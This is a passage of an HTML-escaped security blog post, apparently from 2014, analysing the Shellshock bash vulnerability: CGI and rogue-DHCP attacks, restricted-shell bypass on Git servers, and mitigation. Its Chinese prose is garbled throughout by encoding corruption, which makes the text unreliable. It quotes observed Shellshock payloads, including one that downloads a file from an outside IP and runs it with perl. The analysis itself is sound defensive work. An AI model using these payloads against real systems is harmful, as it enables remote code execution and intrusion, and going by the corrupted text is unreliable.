Â∞çÂÖ®‰∏ñÁïå HTTP ‰º∫ÊúçÂô® (port 80) ÈÄ≤Ë°åÊéÉÊèè„ÄÇÂõ†ÁÇ∫‰∏ÄËà¨‰º∫ÊúçÂô®ÊúÉÂ∞á HTTP Ë°®È†≠‰∏≠‰πãÂÖßÂÆπÊîæÂÖ•Áí∞Â¢ÉËÆäÊï∏‰∏≠ÔºåËã•‰º∫ÊúçÂô®È¶ñÈ†ÅÂÖ•Âè£Á®ãÂºèÊú¨Ë∫´ÊòØ bash shell script ÊàñËÄÖÂÖ∂Â≠êÁ®ãÂ∫èÊúâÂëºÂè´Âà∞ bashÔºåÂ∞±ÊúÉÂèóÂà∞ÊÉ°ÊÑèË™ûÊ≥ïÁöÑÂΩ±ÈüøÔºåÂü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 3 209.126.230.74&lt;/code&gt; Êåá‰ª§„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÊîªÊìä‰ΩøÁî®-cgi-ÁöÑÁ∂≤È†Å‰º∫ÊúçÂô®&quot;&gt;ÊîªÊìä‰ΩøÁî® CGI ÁöÑÁ∂≤È†Å‰º∫ÊúçÂô®&lt;/h4&gt;

&lt;p&gt;Âà©Áî®ÂêåÊ®£ÁöÑÈÅìÁêÜÔºåÊÉ°ÊÑèÊîªÊìäËÄÖÈñãÂßãÂú® HTTP Ë°®È†≠‰∏≠ÁΩÆÂÖ•ÊÉ°ÊÑèÁöÑË™ûÊ≥ïÔºåÂ§ßÈáèÂéªÊéÉÊèèÁ∂≤Ë∑Ø‰∏äÁöÑ CGI Á∂≤È†ÅÔºåÂõ†ÁÇ∫ÈÄôÁ®ÆÁ∂≤È†ÅÂ∏∏ÂëºÂè´Á≥ªÁµ±Êåá‰ª§ÔºåÊâÄ‰ª•ÊàêÂäüÊ©üÁéáÈÉΩÈ†óÈ´òÔºåÊîªÊìäÊàêÂäüÁöÑÁµêÊûúÂ¶Ç‰∏ãÂúñÔºåÂæûÈÄôÂºµÂúñ‰πüÂèØ‰∫ÜËß£ÈÄôÂÄãÂº±ÈªûÂèØ‰ª•Á∞°ÂñÆÂú∞ÈÄèÈÅé‰∏ÄÂÄãÂèÉÊï∏Â∞±ËÉΩÁõ¥Êé•ËÆìÁ≥ªÁµ±Âü∑Ë°å‰ªªÊÑèÊåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;ÊîªÊìä‰ΩøÁî® CGI ÁöÑÁ∂≤È†Å‰º∫ÊúçÂô®&quot; title=&quot;ÊîªÊìä‰ΩøÁî® CGI ÁöÑÁ∂≤È†Å‰º∫ÊúçÂô®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÂØ¶‰ΩúÊµÅÁ®ãË´ãÂèÉËÄÉ‰∏ãÈù¢ÂΩ±ÁâáÔºö&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/RUsHcZi2hIU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;ÊàëÂÄëÂúòÈöä‰πüÂú® CGI Áí∞Â¢É‰∏ãÂü∑Ë°åÂπæÁ®ÆÁ®ãÂºèË™ûË®ÄÈÄ≤Ë°åÊ∏¨Ë©¶ÔºåÁôºÁèæÁî®Âà∞‰ª•‰∏ã function ÊôÇÊúÉËÆÄÂèñÂà∞Áí∞Â¢ÉËÆäÊï∏Ôºàdate Âè™ÊòØÁØÑ‰æãÔºåÂèØ‰ª£ÊèõÁÇ∫ÂÖ∂‰ªñÁ≥ªÁµ±Êåá‰ª§ÔºâÔºåÂõ†Ê≠§Ëã•‰º∫ÊúçÂô®Âú® CGI Áí∞Â¢É‰∏ã‰ΩøÁî®ÈÄô‰∫õ functionÔºåÊúÉÁÇ∫‰º∫ÊúçÂô®Êú¨Ë∫´Â∏∂‰æÜÂö¥ÈáçÈ¢®Èö™„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(‚Äúdate &amp;gt; /dev/null‚Äù);&lt;br /&gt;open(SHELLSHOCK, ‚Äú| date &amp;gt; /dev/null‚Äù);&lt;br /&gt;system(‚Äúdate &amp;gt; /dev/null;‚Äù);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(‚Äòdate‚Äô);&lt;br /&gt;system(‚Äòdate‚Äô);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;os.system(‚Äòdate‚Äô)&lt;br /&gt;subprocess.call(‚Äòdate‚Äô, shell=True)&lt;br /&gt;subprocess.Popen(‚Äòdate‚Äô, shell=True)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec ‚Äòdate‚Äô&lt;br /&gt;system ‚Äòdate‚Äô&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Âª∫ÁΩÆÊÉ°ÊÑè-dhcp-‰º∫ÊúçÂô®ÊÑüÊüìÈÄ£Á∑ö‰ΩøÁî®ËÄÖ&quot;&gt;Âª∫ÁΩÆÊÉ°ÊÑè DHCP ‰º∫ÊúçÂô®ÊÑüÊüìÈÄ£Á∑ö‰ΩøÁî®ËÄÖ&lt;/h4&gt;

&lt;p&gt;ÂêåÊôÇÔºåÊúâÂè¶‰∏ÄÊâπ‰∫∫ÁôºÁèæÊüê‰∫õ‰ΩúÊ•≠Á≥ªÁµ±Âú®ÈÄ≤Ë°å DHCP ÈÄ£Á∑öÊôÇÔºåÊúÉÂ∞á DHCP ‰º∫ÊúçÂô®ÂÇ≥ÂÖ•ÁöÑ‰∏Ä‰∫õË≥áË®äÂ°ûÂÖ•Âà∞Áí∞Â¢ÉËÆäÊï∏‰∏≠„ÄÇÊñºÊòØÔºåËã•Âª∫ÁΩÆ‰∏ÄÂÄãÊÉ°ÊÑè DHCP ‰º∫ÊúçÂô®ÔºåÂ∞çÂÖ∂ÈÄ£Á∑öÁöÑ‰ΩøÁî®ËÄÖÂ∞±ÊúâÂæàÈ´òÁöÑÊ©üÊúÉÈÅ≠ÂèóÊîªÊìä„ÄÇÊàëÂÄëÂØ¶ÈöõÂÅö‰∫ÜÂØ¶È©óÊîªÊìä‰∏ÄËà¨‰ΩøÁî®ËÄÖÔºåÂú®‰ΩøÁî®ËÄÖÂª∫Á´ãÈÄ£Á∑öÁöÑÁï∂‰∏ãÊîæÁΩÆÂæåÈñÄÔºåÂØ¶È©óÈÅéÁ®ãÂ¶Ç‰∏ãÂΩ±ÁâáÔºö&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
ÊàëÂÄë‰πüÂàÜÂà•Ê∏¨Ë©¶‰∫ÜÂú®‰∏çÂêå‰ΩúÊ•≠Á≥ªÁµ±‰∏ãÊòØÂê¶ÊúÉÂèóÂà∞ÊÉ°ÊÑè DHCP ‰º∫ÊúçÂô®ÂΩ±ÈüøÔºåÂü∫Êú¨‰∏äÔºåÂ∏∏Ë¶ãÁöÑ un*x Á≥ªÁµ±ÈñãÊ©üÂæåËá™ÂãïÈÄ£Á∑öÂü∫Êú¨‰∏äÈÉΩÊúÉ‰∏≠Êãõ„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (Â∑≤‰øÆÂæ©)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;17 ‚ÄúQiana‚Äù Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (Â∑≤‰øÆÂæ©)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ÁπûÈÅé-gitsubversion-‰º∫ÊúçÂô®ÁöÑ-shell-ÈôêÂà∂&quot;&gt;ÁπûÈÅé Git/Subversion ‰º∫ÊúçÂô®ÁöÑ shell ÈôêÂà∂&lt;/h4&gt;

&lt;p&gt;Shellshock ‰πüÂ∏∏Ë¢´Âà©Áî®‰æÜÁπûÈÅé‰º∫ÊúçÂô®ÁöÑ shell ÈôêÂà∂ÔºåÊúÄÂ∏∏Ë¶ãÁöÑÂ∞±ÊòØ Git Âíå Subversion ‰º∫ÊúçÂô®Ôºö
ÈÄöÂ∏∏ÈÄô‰∫õ‰º∫ÊúçÂô®ÂÖÅË®±ÈÄèÈÅé SSH ÈÄ£Á∑öÔºå‰ΩÜÁôªÂÖ•ÂæåÈÉΩÂ∞çÊáâËëóÂèóÈôêÂà∂ÁöÑ shell„ÄÇÈÄèÈÅéÊ≠§ÊºèÊ¥ûÔºåÂèØ‰ª•ÁπûÈÅé shell ÁöÑÈôêÂà∂ÔºåÂü∑Ë°åÊåá‰ª§Â¶Ç‰∏ãÂúñ„ÄÇÔºàË®ªÔºöOS ‰∏≠ git user È†êË®≠ shell Ë¶ÅÁÇ∫ bash ÊâçÊúÉÂèóÂà∞ÂΩ±ÈüøÔºâ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;ÁπûÈÅé Git/Subversion ‰º∫ÊúçÂô®ÁöÑ shell ÈôêÂà∂&quot; title=&quot;ÁπûÈÅé Git/Subversion ‰º∫ÊúçÂô®ÁöÑ shell ÈôêÂà∂&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰∏ÄËà¨ÊàëÂÄëË¶ÅÂØ¶‰ΩúÁâπÂÆö‰ΩøÁî®ËÄÖÁôªÂÖ• ssh Âè™ËÉΩÂÅöÁâπÂÆöÁöÑ‰∫ãÊÉÖÔºåÂ∏∏Â∏∏ÊúÉÂú® sshd_config Ë®≠ÂÆö ForceCommandÔºåÊàñÊòØÂú® authorized_keys Ë®≠ÂÆö command= Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÊ¨°ÊúÉÂèóÂà∞ Shellshock ÂΩ±ÈüøÔºåÂ∞±ÊòØÂõ†ÁÇ∫ÈÄô‰∫õË®≠ÂÆöÊúÉÂú®‰ΩøÁî®ËÄÖÈÄèÈÅé ssh ÁôªÂÖ•ÊôÇÔºåÂëºÂè´ bash Âü∑Ë°åÔºåÁï∂Áí∞Â¢ÉËÆäÊï∏Ë¢´ÂºïÂÖ•ÔºåÊÉ°ÊÑèÁöÑÁ®ãÂºèÁ¢ºÂ∞±ÊúÉË¢´Âü∑Ë°å‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;shellshock-Â®ÅËÑÖ‰ªçÂú®Êì¥Â§ß&quot;&gt;Shellshock Â®ÅËÑÖ‰ªçÂú®Êì¥Â§ß&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâç‰∏çÁÆ°ÊòØÁôΩÂ∏ΩÈß≠ÂÆ¢ÊàñÊòØÈªëÂ∏ΩÈß≠ÂÆ¢ÈÉΩÈÇÑÂú®ÊåÅÁ∫åÂ∞ãÊâæÂèØ‰ª•Âà©Áî® Shellshock ÁöÑÂú∞ÊñπÔºåÂ¶ÇÂêåÂâçÈù¢ÊâÄËø∞ÔºåÊâæÂà∞ÂèØ‰ª•ÂØ´ÂÖ•Áí∞Â¢ÉËÆäÊï∏ÁöÑÂú∞ÊñπÔºå‰∏¶‰∏îÈ†ÜÂà©ÂÇ≥ÂÖ• bash Âü∑Ë°åÔºåÂ∞±ÂèØ‰ª•Âà©Áî®Ë©≤Âº±Èªû‰æÜÂü∑Ë°åÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;Âæû Shellshock ÁàÜÁôºËá≥‰ªäÔºåÈô∏Èô∏Á∫åÁ∫åÂÇ≥Âá∫‰∫ÜÂæàÂ§öÂÖ¨Âè∏ÁöÑÁî¢ÂìÅÂèóÂà∞Ê≠§Âº±ÈªûÂΩ±ÈüøÔºåÊï¥ÁêÜ&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;Âú®Ê≠§&lt;/a&gt;Ôºå‰πüÊúâ‰∏Ä‰∫õ POC Êï¥ÁêÜÂú®&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;ÈÄôË£°&lt;/a&gt;„ÄÇ ÂÖ∂‰∏≠‰∏ç‰πèÂá∫Áèæ‰∏Ä‰∫õÂ∏∏Áî®Áü•ÂêçÂ•ó‰ª∂Â¶ÇÔºöOpenVPN„ÄÅPure-FTPdÔºåËÄå‰∏îÊåÅÁ∫åÊõ¥Êñ∞‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁèæÂú®ÈáùÂ∞ç HTTP ‰º∫ÊúçÂô®ÁöÑÊîªÊìäÈÇÑÊòØ‰ΩîÂ§öÊï∏ÔºåÊà™Ëá≥ÁõÆÂâçÁÇ∫Ê≠¢ÊàëÂÄë‰ªçÊåÅÁ∫åÁôºÁèæÁ∂≤Ë∑Ø‰∏äÊúâÂêÑÁ®ÆÊéÉÊèèÊ®£Êú¨Ôºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/‚Ä¶/x ; perl /var/tmp/x&quot;&lt;/li&gt;
  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Èô§‰∫ÜÈÄô‰∫õÈô∏Á∫åÈáùÂ∞ç HTTP ‰º∫ÊúçÂô®ÁöÑÊ°à‰æãÔºåÊàëÂÄëË™çÁÇ∫Ôºå‰∏Ä‰∫õÂÖ¨Âè∏Ë≥ºÂÖ•ÁöÑÁ∂≤Ë∑ØË®≠ÂÇôÊòØ Shellshock ÊΩõÂú®È´òÂç±Èö™Áæ§ÔºåÈÇ£‰∫õË≤∑‰æÜÂ∞±Êì∫Âú®ÊóÅÈÇäÁ∂≠ÈÅãÁöÑË®≠ÂÇôÔºå‰∏Ä‰æÜÂÆπÊòìË¢´ÂøΩÁï•Ôºå‰∫å‰æÜÊòØÂÖ∂Êõ¥Êñ∞‰∏çÊòìÔºå‰∏â‰æÜÈÄô‰∫õË®≠ÂÇôÂ∏∏‰ΩøÁî®Âà∞ bashÔºåÂõ†Ê≠§‰ªçÊòØÁèæÂú®ÊÉ°ÊÑèÊîªÊìäËÄÖÂ∞àÊ≥®Á†îÁ©∂ÁöÑÁõÆÊ®ôÔºåË´ãÂ§ßÂÆ∂ÁâπÂà•Â∞èÂøÉ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñÁÑ°ÈúÄÈÅéÂ∫¶ÊÅêÊÖå‰ΩÜÂà•Êéâ‰ª•ËºïÂøÉ&quot;&gt;ÁµêË´ñÔºöÁÑ°ÈúÄÈÅéÂ∫¶ÊÅêÊÖåÔºå‰ΩÜÂà•Êéâ‰ª•ËºïÂøÉ&lt;/h3&gt;

&lt;p&gt;„ÄåÂè™Ë¶ÅÊúâ bash ÁöÑÁ≥ªÁµ±ÂÖ®ÈÉ®ÈÉΩÊòØÂèóÈß≠ÁØÑÂúçÔºÅ„Äç&lt;/p&gt;

&lt;p&gt;‰∏çÂ∞ëÊúãÂèãÁúãÂà∞ÊúÄËøë Shellshock ÁöÑÊñ∞ËÅûÂ†±Â∞éÔºåÈÉΩÂçÅÂàÜÁ∑äÂºµ„ÄÇÂÑòÁÆ°ÂêÑ‰ΩçÊâÄ‰ΩøÁî®ÁöÑ bash ÊòØÂê´ÊúâÊºèÊ¥ûÁöÑÁâàÊú¨Ôºå‰ΩÜË¶ÅÊàêÂäüÂü∑Ë°åÊîªÊìäÊâãÊ≥ïÈúÄË¶ÅË®±Â§öÊ¢ù‰ª∂ÔºåË¢´ÊîªÊìäËÄÖÂæûÈÅ†Á´ØÊîªÊìäÁöÑÊ©üÁéáÂÅè‰ΩéÔºåÂõ†Ê≠§Â§ßÂÆ∂‰∏çÈúÄË¶ÅÂ§™ÈÅéÊÅêÊÖåÔºåÂè™Ë¶ÅÊ≥®ÊÑè‰ª•‰∏ãË®≠ÂÇôÊàñ‰º∫ÊúçÂô®Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÁâπÂÆö Linux ÁâàÊú¨Ôºå‰∏¶‰∏î‰ΩøÁî® DHCP ÈÄ£Á∑ö&lt;/li&gt;
  &lt;li&gt;Á∂≤Ë∑Ø„ÄÅË≥áÂÆâË®≠ÂÇô&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® CGI ÁöÑÁ∂≤Á´ô‰º∫ÊúçÂô®&lt;/li&gt;
  &lt;li&gt;Â∑≤Á∂ìÂÖ¨Â∏ÉÂê´ÊúâÂº±ÈªûÁöÑÂ•ó‰ª∂&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÇ£ÊàëÂÄëË©≤ÊÄéÈ∫ºËá™‰øùÂë¢ÔºüÂú®ÊîªÊìäÊâãÊ≥ï‰∏çÊñ∑Á≤æÈÄ≤‰πã‰∏ãÔºåÂè™ÈÅéÊøæ CVE-2014-6271 ÁöÑÊîªÊìäÂ≠ó‰∏≤‰∏¶Ê≤íÊúâËæ¶Ê≥ïÂÆåÂÖ®ÈòªÊìãÊîªÊìä„ÄÇÂª∫Ë≠∞ÂèØ‰ª•ÂÖàÂ∞á‰º∫ÊúçÂô®ÁöÑ bash ÂçáÁ¥öËá≥ÊúÄÊñ∞ÁâàÊú¨Ôºå‰∏¶ÊåÅÁ∫åÈóúÊ≥®ÂæåÁ∫åÊõ¥Êñ∞Ë®äÊÅØÔºàÁõÆÂâçÊåÅÁ∫åÊúâÁπûÈÅéÊ™¢Êü•ÁöÑÊñ∞ CVE Âº±ÈªûÁôº‰ΩàÔºâÔºå‰ΩøÁî® CGI ‰πã‰º∫ÊúçÂô®Êê≠ÈÖç iptables„ÄÅIDS„ÄÅMod Security Á≠âÊ©üÂà∂ÂÅµÊ∏¨ÊîªÊìäÁâπÂæµ‰∏¶Â∞áÂÖ∂ÈòªÊìã„ÄÇËã•ÊúâË®≠ÂÇôÂú®ÈÄôÊ¨°ÁöÑÂΩ±ÈüøÁØÑÂúçÔºå‰πüË®òÂæóÂêëÂéüÂª†Á¥¢ÂèñÊõ¥Êñ∞Á®ãÂºè„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;È°åÂ§ñË©±&quot;&gt;È°åÂ§ñË©±&lt;/h3&gt;

&lt;p&gt;Êúâ‰∫∫Ë™™Ôºö„ÄåLinux Âú® 2014 Âπ¥Êé•ÈÄ£Âá∫ÂåÖÔºåÁúüÊòØ‰∏ÄÂÄã‰∏çÂÆâÂÖ®ÁöÑ‰ΩúÊ•≠Á≥ªÁµ±ÔºÅÂèçËßÄ Windows Âú®ÈÄôÂπæÊ¨°ÈÉΩÊØ´ÁÑ°ÂΩ±ÈüøÔºå‰ºÅÊ•≠ÊáâË©≤Ë¶ÅÂÖ®Èù¢ÊîπÁî® Microsoft SolutionÔºÅ„ÄçÔºå‰ΩÜÈÄôÁúüÁöÑÊòØÊ≠£Á¢∫ÁöÑÊÉ≥Ê≥ïÂóéÔºüÂÖ∂ÂØ¶‰∏ÄÂÄã OpenSource ÁöÑÁ≥ªÁµ±„ÄÅËªüÈ´îÔºåÂèØ‰ª•ËóâÁî±Á§æÁæ§ÁöÑÂäõÈáèÊ™¢Ë¶ñÂéüÂßãÁ¢ºÁöÑÂïèÈ°åÔºåÈõÜÂêàÁúæ‰∫∫ÁöÑÂäõÈáèËÆìÁ≥ªÁµ±ËÆäÂæóÊõ¥Âä†ÂÆâÂÖ®„ÄÇÂõ†Ê≠§ÊúâË¢´Êè≠Èú≤Âá∫ÊºèÊ¥ûÔºåÂ∞çÊñº‰∏ÄÂÄãÁ≥ªÁµ±‰æÜË™™ÊòØÂ•Ω‰∫ã„ÄÇËÄåÈùû OpenSource ÁöÑÁ≥ªÁµ±ÔºåÂ∞±Âè™ËÉΩ‰ª∞Ë≥¥ÂéüÂª†Ëá™Â∑±ÁöÑË≥áÂÆâÂúòÈöäÈÄ≤Ë°åÁ†îÁ©∂ÔºåÊàñËÄÖÊòØÂ§ñÈÉ®Ë≥áÂÆâ‰∫∫Âì°ÁöÑÁôºÊéò‰∫Ü„ÄÇÈÅ∏Êìá‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂéüÂâáÔºåÊúÄÂ•Ω‰æùÁÖßÁ≥ªÁµ±ÁöÑÂäüËÉΩÈúÄÊ±Ç„ÄÅÁî¢ÂìÅÂÆö‰Ωç„ÄÅÂÆâÂÖ®ÊºèÊ¥ûÁöÑ‰øÆË£úÈÄüÂ∫¶Á≠âÂ±§Èù¢ÔºåÊâçËÉΩÂ§†ÈÅ∏Áî®ÁúüÊ≠£Á¨¶ÂêàËá™Â∑±ÈúÄË¶ÅÁöÑÁ≥ªÁµ±„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë®ªËß£&quot;&gt;Ë®ªËß£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Ëã•ÊâãÂãïÂü∑Ë°å dhclientÔºåÂâáÊúÉÈÅ≠Âà∞ÊºèÊ¥ûÂΩ±Èüø„ÄÇ¬†&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;¬†&lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
